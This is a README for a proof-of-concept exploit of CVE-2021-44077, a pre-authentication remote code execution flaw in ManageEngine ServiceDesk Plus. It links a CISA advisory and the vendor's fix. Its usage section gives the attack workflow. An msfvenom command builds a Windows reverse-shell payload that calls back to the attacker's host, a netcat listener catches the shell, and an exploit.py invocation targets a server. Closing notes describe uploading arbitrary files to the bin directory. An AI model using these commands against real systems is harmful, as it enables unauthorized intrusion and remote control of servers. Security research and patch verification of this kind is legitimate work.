# CVE-2021-44077
Proof of Concept Exploit for CVE-2021-44077: PreAuth RCE in ManageEngine ServiceDesk Plus < 11306

Based on:
- https://xz.aliyun.com/t/10631

CISA Advisory:
- https://www.cisa.gov/uscert/ncas/alerts/aa21-336a

Remediation (Update to build 11306 or later):
- https://www.manageengine.com/products/service-desk/security-response-plan.html

Tested on ManageEngine ServiceDesk Plus Build 11303. Disabled all AV.

## Usage

The exploit uploads a Windows executable to the target and executes it.

To exploit, first generate any executable. For instance:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<YOUR PORT> -f exe > msiexec.exe
```

If you're trying to catch a reverse shell, run your listener first, e.g.

```
nc -l 4444
```

Then run the exploit script, passing in the `url` and `exe` arguments, e.g.

```
python exploit.py http://<TARGET>:<PORT> <path_to_exe>
```

![Proof](proof.png)


# Exploit Notes

- The vulnerability you to upload any file to the install `bin` directory, including existing files such as batch scripts. There may be other ways to invoke the uploaded file.
- Directly uploading a web shell seems to be prevented by a filter.